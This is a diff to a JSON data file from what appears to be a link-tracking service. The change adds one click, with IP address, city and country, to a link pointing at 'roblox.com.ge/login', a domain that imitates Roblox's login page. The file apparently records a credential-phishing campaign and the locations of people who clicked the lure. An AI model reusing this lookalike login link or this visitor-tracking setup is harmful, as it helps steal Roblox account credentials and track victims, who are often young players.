@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1248,
+    "useCount": 1249,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10128,6 +10128,14 @@
         "city": "Castelar",
         "flag": "🇦🇷",
         "countryCode": "AR"
+      },
+      {
+        "timestamp": 1777343420912,
+        "ip": "103.226.25.7",
+        "country": "Philippines",
+        "city": "Tacloban City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
